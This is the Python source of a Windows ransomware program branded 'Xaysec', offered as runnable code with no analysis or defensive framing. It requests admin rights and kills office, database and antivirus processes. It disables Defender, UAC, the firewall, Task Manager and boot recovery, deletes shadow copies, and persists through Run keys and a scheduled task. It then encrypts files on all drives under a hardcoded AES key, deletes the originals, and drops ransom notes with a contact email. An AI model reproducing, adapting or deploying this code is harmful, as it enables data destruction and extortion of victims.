import os,sys,string,hashlib,base64,ctypes,shutil,time,subprocess,threading,winreg,psutil,random
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from concurrent.futures import ThreadPoolExecutor,as_completed
import ctypes.wintypes

if not ctypes.windll.shell32.IsUserAnAdmin():
    ctypes.windll.shell32.ShellExecuteW(None,"runas",sys.executable," ".join(sys.argv),None,1)
    sys.exit()

E = ('.txt','.doc','.docx','.xls','.xlsx','.ppt','.pptx','.pdf','.jpg','.jpeg','.png','.gif','.bmp','.tiff','.svg',
     '.mp4','.avi','.mov','.wmv','.flv','.mkv','.webm','.mp3','.wav','.flac','.aac','.ogg','.zip','.rar','.7z','.tar',
     '.gz','.bz2','.iso','.img','.vhd','.vmdk','.db','.sqlite','.mdb','.accdb','.psd','.ai','.eps','.indd','.cpp','.c',
     '.py','.java','.cs','.php','.html','.css','.js','.xml','.json','.yml','.yaml','.ini','.cfg','.conf','.pem','.key',
     '.crt','.cer','.pfx','.p12','.ovpn','.rdp','.vdi','.vbox','.ova','.ovf','.log','.bak','.old','.tmp','.swp','.sql',
     '.dmp','.dump','.nrg','.mdf','.ldf','.frm','.myi','.myd','.ibd','.fdb','.gdb','.dbf','.accde','.mde','.ade','.sln',
     '.suo','.user','.vs','.vscode','.project','.classpath','.settings','.idea','.iml','.ipr','.iws','.module','.targets',
     '.props','.nuget','.packages','.git','.hg','.svn','.docker','.env','.vsix','.msi','.exe','.dll','.sys','.drv','.bin',
     '.dat','.save','.sav','.cfg','.conf','.config','.properties','.inf','.reg','.bat','.cmd','.ps1','.vbs','.js','.vbe',
     '.jse','.wsf','.wsh','.scr','.com','.pif','.gadget','.msh','.msh1','.msh2','.mshxml','.msh1xml','.msh2xml','.scf',
     '.lnk','.url','.webloc','.desktop','.mst','.msc','.cpl','.nsh','.nsi','.au3','.lua','.pl','.pm','.pod','.tcl','.tk',
     '.rb','.groovy','.gradle','.mf','.clj','.scala','.go','.rs','.swift','.kt','.dart','.fs','.fsx','.vb','.vba','.vbs',
     '.ws','.wsc','.wbt','.htaccess','.htpasswd','.user.ini','.gitignore','.gitattributes','.gitmodules','.editorconfig',
     '.eslintrc','.babelrc','.npmrc','.yarnrc','.prettierrc','.stylelintrc','.jshintrc','.flowconfig','.browserslistrc',
     '.env.example','.env.local','.env.development','.env.test','.env.production','.vscode','.idea','.class','.jar','.war',
     '.ear','.par','.sar','.mar','.rar','.tar.gz','.tgz','.bz2','.xz','.lzma','.zst','.zstd','.7z.001','.7z.002','.zipx',
     '.arc','.arj','.cab','.msu','.msp','.msm','.mst','.chm','.hlp','.cbt','.cbz','.cbr','.cb7','.cbt','.pdf','.ps','.eps',
     '.ai','.svgz','.cdr','.cmx','.cpx','.csl','.dis','.drw','.dwg','.dxf','.gbr','.ger','.gko','.glb','.gltf','.3ds',
     '.obj','.stl','.ply','.fbx','.dae','.x','.x3d','.wrl','.vrml','.scad','.step','.stp','.igs','.iges','.brep','.sat',
     '.sab','.x_t','.x_b','.xmt','.xmt_txt','.jt','.prt','.asm','.neu','.cgr','.model','.catpart','.catproduct','.cgr',
     '.exp','.dlv','.3dxml','.3mf','.amf','.bld','.mesh','.iv','.lwo','.lws','.scn','.3dm','.3mf','.blend','.dae','.fbx',
     '.gltf','.glb','.kmz','.kml','.geojson','.gpx','.gdb','.mdb','.accdb','.sqlite','.sqlite3','.db3','.dbf','.fdb','.gdb',
     '.mdf','.ldf','.ndf','.bdf','.ora','.dmp','.trc','.log','.audit','.csv','.tsv','.xls','.xlsx','.xlsm','.xlsb','.xltx',
     '.xltm','.ods','.ots','.sxc','.dbf','.dif','.wk1','.wk3','.wk4','.wks','.123','.pqd','.fp','.rpt','.rri','.sdc','.slk',
     '.vda','.wq1','.wq2','.xlw','.numbers','.key','.pages','.rtf','.odt','.ott','.sxw','.uot','.wpd','.wps','.wpt','.doc',
     '.docx','.dot','.dotx','.docm','.dotm','.rtf','.odt','.ott','.sxw','.uot','.wpd','.wps','.wpt','.pub','.pptx','.ppt',
     '.pps','.ppsx','.pot','.potx','.ppam','.ppsm','.odp','.otp','.sxi','.uop','.keynote','.thmx','.vsdx','.vsd','.vst',
     '.vss','.vsw','.vdx','.vrl','.vtx','.vtt','.vttx','.vstx','.vssx','.vswx','.mpp','.mpt','.mpd','.mpx','.mpc','.mpw',
     '.mppx','.mptx','.xml','.xsl','.xslt','.xsn','.xsf','.xtp','.xslx','.xlat','.xla','.xlam','.xll','.xlw','.xld','.xlt',
     '.xla5','.xla8','.xladd','.xll','.xlm','.xlc','.xlr','.xls5','.xls8','.xlsx','.xlsm','.xltx','.xltm','.xlsb','.xlam',
     '.xll','.xlw','.numbers','.et','.ett','.s3z','.s3db','.sqlite','.sqlite3','.db','.db3','.mdb','.accdb','.pdb','.fdb',
     '.gdb','.ib','.ufd','.ym','.ymd','.frm','.myi','.myd','.ibdata','.ib_logfile','.cnf','.opt','.par','.dat','.ctl','.dbf',
     '.ora','.trc','.utl','.bad','.dis','.err','.idx','.lck','.lob','.log','.btr','.dbs','.dat','.data','.ndf','.mdf','.ldf',
     '.bdf','.frm','.myd','.myi','.dbt','.dbv','.dbi','.dbs','.dbx','.dbd','.dbm','.pdb','.adf','.adp','.mda','.mdn','.mdw',
     '.mdt','.mde','.ade','.laccdb','.lcf','.lcs','.lck','.lks','.lnk','.log','.lgf','.lgx','.lif','.lixo','.ljp','.lmb',
     '.lmp','.lms','.lmt','.lmx','.lng','.lns','.lnt','.lob','.loc','.lp','.lpd','.lpe','.lpf','.lpk','.lpl','.lpm','.lpp',
     '.lps','.lpt','.lpx','.lqr','.lqt','.lra','.lrf','.lrp','.lrs','.lrv','.lrz','.ls','.lsa','.lsf','.lsg','.lsh','.lsi',
     '.lsm','.lsp','.lsq','.lsr','.lst','.lsu','.lsv','.lsx','.lsy','.lt','.ltf','.ltg','.lth','.ltm','.lto','.ltp','.ltr',
     '.lts','.ltt','.ltx','.ltz','.lu','.lua','.luc','.lud','.luf','.lug','.luh','.lui','.luk','.lul','.lum','.lun','.luo',
     '.lup','.luq','.lus','.lut','.luu','.luv','.luw','.lux','.luy','.luz','.lv','.lvb','.lvc','.lvd','.lve','.lvf','.lvh',
     '.lvi','.lvk','.lvl','.lvm','.lvn','.lvo','.lvp','.lvq','.lvr','.lvs','.lvt','.lvu','.lvv','.lvw','.lvx','.lvy','.lvz',
     '.lwd','.lwe','.lwf','.lwh','.lwi','.lwk','.lwl','.lwm','.lwo','.lwp','.lwr','.lws','.lwt','.lwu','.lww','.lwx','.lwy',
     '.lwz','.lx','.lxb','.lxd','.lxf','.lxh','.lxi','.lxk','.lxl','.lxm','.lxn','.lxo','.lxp','.lxq','.lxs','.lxt','.lxu',
     '.lxv','.lxw','.lxx','.lxy','.lxz','.ly','.lyb','.lyc','.lyd','.lyf','.lyg','.lyh','.lyi','.lyk','.lyl','.lym','.lyn',
     '.lyo','.lyp','.lyq','.lys','.lyt','.lyu','.lyv','.lyw','.lyx','.lyy','.lyz','.lz','.lzh','.lzma','.lzo','.lzx','.m',
     '.m1v','.m2a','.m2p','.m2t','.m2ts','.m2v','.m3u','.m3u8','.m4a','.m4b','.m4p','.m4v','.m4r','.m4p','.m4a','.m4b',
     '.m4r','.m4v','.ma','.ma1','.ma2','.ma3','.ma4','.ma5','.ma6','.ma7','.ma8','.ma9','.mae','.mag','.mai','.map','.mar',
     '.mas','.mat','.mau','.max','.mb','.mb1','.mb2','.mb3','.mb4','.mb5','.mb6','.mb7','.mb8','.mb9','.mba','.mbb','.mbc',
     '.mbd','.mbe','.mbf','.mbg','.mbh','.mbi','.mbj','.mbk','.mbl','.mbm','.mbn','.mbo','.mbp','.mbq','.mbr','.mbs','.mbt',
     '.mbu','.mbv','.mbw','.mbx','.mby','.mbz','.mc','.mc1','.mc2','.mc3','.mc4','.mc5','.mc6','.mc7','.mc8','.mc9','.mca',
     '.mcb','.mcc','.mcd','.mce','.mcf','.mcg','.mch','.mci','.mcj','.mck','.mcl','.mcm','.mcn','.mco','.mcp','.mcq','.mcr',
     '.mcs','.mct','.mcu','.mcv','.mcw','.mcx','.mcy','.mcz','.md','.md0','.md1','.md2','.md3','.md4','.md5','.md6','.md7',
     '.md8','.md9','.mda','.mdb','.mdc','.mdd','.mde','.mdf','.mdg','.mdh','.mdi','.mdj','.mdk','.mdl','.mdm','.mdn','.mdo',
     '.mdp','.mdq','.mdr','.mds','.mdt','.mdu','.mdv','.mdw','.mdx','.mdy','.mdz','.me','.me1','.me2','.me3','.me4','.me5',
     '.me6','.me7','.me8','.me9','.mea','.meb','.mec','.med','.mee','.mef','.meg','.meh','.mei','.mej','.mek','.mel','.mem',
     '.men','.meo','.mep','.meq','.mer','.mes','.met','.meu','.mev','.mew','.mex','.mey','.mez','.mf','.mf1','.mf2','.mf3',
     '.mf4','.mf5','.mf6','.mf7','.mf8','.mf9','.mfa','.mfb','.mfc','.mfd','.mfe','.mff','.mfg','.mfh','.mfi','.mfj','.mfk',
     '.mfl','.mfm','.mfn','.mfo','.mfp','.mfq','.mfr','.mfs','.mft','.mfu','.mfv','.mfw','.mfx','.mfy','.mfz','.mg','.mg1',
     '.mg2','.mg3','.mg4','.mg5','.mg6','.mg7','.mg8','.mg9','.mga','.mgb','.mgc','.mgd','.mge','.mgf','.mgg','.mgh','.mgi',
     '.mgj','.mgk','.mgl','.mgm','.mgn','.mgo','.mgp','.mgq','.mgr','.mgs','.mgt','.mgu','.mgv','.mgw','.mgx','.mgy','.mgz',
     '.mh','.mh1','.mh2','.mh3','.mh4','.mh5','.mh6','.mh7','.mh8','.mh9','.mha','.mhb','.mhc','.mhd','.mhe','.mhf','.mhg',
     '.mhh','.mhi','.mhj','.mhk','.mhl','.mhm','.mhn','.mho','.mhp','.mhq','.mhr','.mhs','.mht','.mhu','.mhv','.mhw','.mhx',
     '.mhy','.mhz','.mi','.mi1','.mi2','.mi3','.mi4','.mi5','.mi6','.mi7','.mi8','.mi9','.mia','.mib','.mic','.mid','.mie',
     '.mif','.mig','.mih','.mii','.mij','.mik','.mil','.mim','.min','.mio','.mip','.miq','.mir','.mis','.mit','.miu','.miv',
     '.miw','.mix','.miy','.miz','.mj','.mj1','.mj2','.mj3','.mj4','.mj5','.mj6','.mj7','.mj8','.mj9','.mja','.mjb','.mjc',
     '.mjd','.mje','.mjf','.mjg','.mjh','.mji','.mjj','.mjk','.mjl','.mjm','.mjn','.mjo','.mjp','.mjq','.mjr','.mjs','.mjt',
     '.mju','.mjv','.mjw','.mjx','.mjy','.mjz','.mk','.mk1','.mk2','.mk3','.mk4','.mk5','.mk6','.mk7','.mk8','.mk9','.mka',
     '.mkb','.mkc','.mkd','.mke','.mkf','.mkg','.mkh','.mki','.mkj','.mkk','.mkl','.mkm','.mkn','.mko','.mkp','.mkq','.mkr',
     '.mks','.mkt','.mku','.mkv','.mkx','.mky','.mkz','.ml','.ml1','.ml2','.ml3','.ml4','.ml5','.ml6','.ml7','.ml8','.ml9',
     '.mla','.mlb','.mlc','.mld','.mle','.mlf','.mlg','.mlh','.mli','.mlj','.mlk','.mll','.mlm','.mln','.mlo','.mlp','.mlq',
     '.mlr','.mls','.mlt','.mlu','.mlv','.mlw','.mlx','.mly','.mlz','.mm','.mm1','.mm2','.mm3','.mm4','.mm5','.mm6','.mm7',
     '.mm8','.mm9','.mma','.mmb','.mmc','.mmd','.mme','.mmf','.mmg','.mmh','.mmi','.mmj','.mmk','.mml','.mmm','.mmn','.mmo',
     '.mmp','.mmq','.mmr','.mms','.mmt','.mmu','.mmv','.mmw','.mmx','.mmy','.mmz','.mn','.mn1','.mn2','.mn3','.mn4','.mn5',
     '.mn6','.mn7','.mn8','.mn9','.mna','.mnb','.mnc','.mnd','.mne','.mnf','.mng','.mnh','.mni','.mnj','.mnk','.mnl','.mnm',
     '.mnn','.mno','.mnp','.mnq','.mnr','.mns','.mnt','.mnu','.mnv','.mnw','.mnx','.mny','.mnz','.mo','.mo1','.mo2','.mo3',
     '.mo4','.mo5','.mo6','.mo7','.mo8','.mo9','.moa','.mob','.moc','.mod','.moe','.mof','.mog','.moh','.moi','.moj','.mok',
     '.mol','.mom','.mon','.moo','.mop','.moq','.mor','.mos','.mot','.mou','.mov','.mow','.mox','.moy','.moz','.mp','.mp1',
     '.mp2','.mp3','.mp4','.mp5','.mp6','.mp7','.mp8','.mp9','.mpa','.mpb','.mpc','.mpd','.mpe','.mpf','.mpg','.mph','.mpi',
     '.mpj','.mpk','.mpl','.mpm','.mpn','.mpo','.mpp','.mpq','.mpr','.mps','.mpt','.mpu','.mpv','.mpw','.mpx','.mpy','.mpz',
     '.mq','.mq1','.mq2','.mq3','.mq4','.mq5','.mq6','.mq7','.mq8','.mq9','.mqa','.mqb','.mqc','.mqd','.mqe','.mqf','.mqg',
     '.mqh','.mqi','.mqj','.mqk','.mql','.mqm','.mqn','.mqo','.mqp','.mqq','.mqr','.mqs','.mqt','.mqu','.mqv','.mqw','.mqx',
     '.mqy','.mqz','.mr','.mr1','.mr2','.mr3','.mr4','.mr5','.mr6','.mr7','.mr8','.mr9','.mra','.mrb','.mrc','.mrd','.mre',
     '.mrf','.mrg','.mrh','.mri','.mrj','.mrk','.mrl','.mrm','.mrn','.mro','.mrp','.mrq','.mrr','.mrs','.mrt','.mru','.mrv',
     '.mrw','.mrx','.mry','.mrz','.ms','.ms1','.ms2','.ms3','.ms4','.ms5','.ms6','.ms7','.ms8','.ms9','.msa','.msb','.msc',
     '.msd','.mse','.msf','.msg','.msh','.msi','.msj','.msk','.msl','.msm','.msn','.mso','.msp','.msq','.msr','.mss','.mst',
     '.msu','.msv','.msw','.msx','.msy','.msz','.mt','.mt1','.mt2','.mt3','.mt4','.mt5','.mt6','.mt7','.mt8','.mt9','.mta',
     '.mtb','.mtc','.mtd','.mte','.mtf','.mtg','.mth','.mti','.mtj','.mtk','.mtl','.mtm','.mtn','.mto','.mtp','.mtq','.mtr',
     '.mts','.mtt','.mtu','.mtv','.mtw','.mtx','.mty','.mtz','.mu','.mu1','.mu2','.mu3','.mu4','.mu5','.mu6','.mu7','.mu8',
     '.mu9','.mua','.mub','.muc','.mud','.mue','.muf','.mug','.muh','.mui','.muj','.muk','.mul','.mum','.mun','.muo','.mup',
     '.muq','.mur','.mus','.mut','.muu','.muv','.muw','.mux','.muy','.muz','.mv','.mv1','.mv2','.mv3','.mv4','.mv5','.mv6',
     '.mv7','.mv8','.mv9','.mva','.mvb','.mvc','.mvd','.mve','.mvf','.mvg','.mvh','.mvi','.mvj','.mvk','.mvl','.mvm','.mvn',
     '.mvo','.mvp','.mvq','.mvr','.mvs','.mvt','.mvu','.mvv','.mvw','.mvx','.mvy','.mvz','.mw','.mw1','.mw2','.mw3','.mw4',
     '.mw5','.mw6','.mw7','.mw8','.mw9','.mwa','.mwb','.mwc','.mwd','.mwe','.mwf','.mwg','.mwh','.mwi','.mwj','.mwk','.mwl',
     '.mwm','.mwn','.mwo','.mwp','.mwq','.mwr','.mws','.mwt','.mwu','.mwv','.mww','.mwx','.mwy','.mwz','.mx','.mx1','.mx2',
     '.mx3','.mx4','.mx5','.mx6','.mx7','.mx8','.mx9','.mxa','.mxb','.mxc','.mxd','.mxe','.mxf','.mxg','.mxh','.mxi','.mxj',
     '.mxk','.mxl','.mxm','.mxn','.mxo','.mxp','.mxq','.mxr','.mxs','.mxt','.mxu','.mxv','.mxw','.mxx','.mxy','.mxz','.my',
     '.my1','.my2','.my3','.my4','.my5','.my6','.my7','.my8','.my9','.mya','.myb','.myc','.myd','.mye','.myf','.myg','.myh',
     '.myi','.myj','.myk','.myl','.mym','.myn','.myo','.myp','.myq','.myr','.mys','.myt','.myu','.myv','.myw','.myx','.myy',
     '.myz','.mz','.mz1','.mz2','.mz3','.mz4','.mz5','.mz6','.mz7','.mz8','.mz9','.mza','.mzb','.mzc','.mzd','.mze','.mzf',
     '.mzg','.mzh','.mzi','.mzj','.mzk','.mzl','.mzm','.mzn','.mzo','.mzp','.mzq','.mzr','.mzs','.mzt','.mzu','.mzv','.mzw',
     '.mzx','.mzy','.mzz')
R = '.Xaysec'
N = 'ransom.txt'
M = 'leakserversupport@gmail.com'
A = '500$'
FIXED_KEY = hashlib.sha256(b'Retaabi21#1986**').digest()  # 32 byte untuk AES-256

def encrypt_file(p, key):
    try:
        with open(p, 'rb') as f:
            data = f.read()
        if not data:
            return False
        iv = os.urandom(16)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        enc = iv + cipher.encrypt(pad(data, AES.block_size))
        with open(p + R, 'wb') as f:
            f.write(enc)
        os.remove(p)
        return True
    except:
        return False

def kill_processes():
    targets = ['winword','excel','powerpnt','outlook','msaccess','mspub','onenote','visio','project',
               'lync','skype','chrome','firefox','edge','brave','opera','iexplore','explorer','taskmgr',
               'regedit','cmd','powershell','wscript','cscript','mshta','java','python','ruby','perl','php',
               'nginx','apache','mysql','postgres','sqlservr','oracle','mongod','redis','docker','vmware',
               'vbox','teamviewer','anydesk','splashtop','remote','rdp','vnc','tightvnc','ultravnc','avast',
               'avg','mcafee','norton','symantec','kaspersky','bitdefender','malwarebytes','eset','f-secure',
               'trend','sophos','panda','webroot','comodo','zonealarm','checkpoint','fortinet','paloalto',
               'cisco','juniper','fireeye','cylance','crowdstrike','sentinelone','carbonblack','tripwire',
               'qualys','tenable','rapid7','bromium']
    for p in psutil.process_iter(['pid','name']):
        try:
            n = p.info['name'].lower()
            if any(t in n for t in targets):
                p.kill()
        except:
            pass

def disable_security():
    try:
        subprocess.run('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true -Force"', shell=True, timeout=3)
    except: pass
    try:
        subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f', shell=True)
    except: pass
    try:
        subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f', shell=True)
    except: pass
    try:
        subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Exclusions\\Paths" /v "' + os.environ['TEMP'] + '" /t REG_SZ /d 0 /f', shell=True)
    except: pass
    try:
        subprocess.run('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v EnableLUA /t REG_DWORD /d 0 /f', shell=True)
    except: pass
    try:
        subprocess.run('vssadmin delete shadows /all /quiet', shell=True)
    except: pass
    try:
        subprocess.run('wmic shadowcopy delete', shell=True)
    except: pass
    try:
        subprocess.run('bcdedit /set {default} recoveryenabled no', shell=True)
    except: pass
    try:
        subprocess.run('bcdedit /set {default} bootstatuspolicy ignoreallfailures', shell=True)
    except: pass
    try:
        subprocess.run('netsh advfirewall set allprofiles state off', shell=True)
    except: pass
    try:
        subprocess.run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f', shell=True)
    except: pass
    try:
        subprocess.run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f', shell=True)
    except: pass
    try:
        subprocess.run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f', shell=True)
    except: pass
    try:
        subprocess.run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoFolderOptions /t REG_DWORD /d 1 /f', shell=True)
    except: pass
    try:
        subprocess.run('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management" /v ClearPageFileAtShutdown /t REG_DWORD /d 1 /f', shell=True)
    except: pass

def set_persistence():
    try:
        exe = os.path.abspath(sys.argv[0])
        subprocess.run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Xaysec /t REG_SZ /d "' + exe + '" /f', shell=True)
        subprocess.run('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v Xaysec /t REG_SZ /d "' + exe + '" /f', shell=True)
        subprocess.run('schtasks /create /tn "Xaysec" /tr "' + exe + '" /sc onlogon /f', shell=True)
    except:
        pass

def write_note(folder):
    path = os.path.join(folder, N)
    if not os.path.exists(path):
        try:
            with open(path, 'w') as f:
                f.write("All your files are encrypted with AES-256-CBC.\n")
                f.write("To get the decryption key, contact us at: " + M + "\n")
                f.write("Include your machine ID in the email.\n")
                f.write("Machine ID: " + hashlib.sha256(os.urandom(32)).hexdigest()[:16] + "\n")
        except:
            pass

def encrypt_drive(drive, key):
    root = drive + ':\\'
    if not os.path.exists(root):
        return
    for r, dirs, files in os.walk(root, topdown=True, followlinks=False):
        try:
            for file in files:
                if file.endswith(R) or file == N:
                    continue
                ext = os.path.splitext(file)[1].lower()
                if ext in E or ext == '':
                    encrypt_file(os.path.join(r, file), key)
            write_note(r)
        except:
            continue

def get_drives():
    drives = []
    for d in string.ascii_uppercase:
        if os.path.exists(d + ':\\'):
            drives.append(d)
    try:
        import win32api
        drives = win32api.GetLogicalDriveStrings().split('\\')[:-1]
    except:
        pass
    return list(set(drives))

def main():
    kill_processes()
    disable_security()
    set_persistence()
    key = FIXED_KEY
    drives = get_drives()
    with ThreadPoolExecutor(max_workers=len(drives) * 2 or 2) as ex:
        futures = [ex.submit(encrypt_drive, d, key) for d in drives]
        for f in as_completed(futures):
            pass
    desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')
    write_note(desktop)
    ctypes.windll.user32.MessageBoxW(0, "All files encrypted!\nRead " + N + " for instructions.", "Xaysec Ransomware", 0x10)

if __name__ == '__main__':
    main()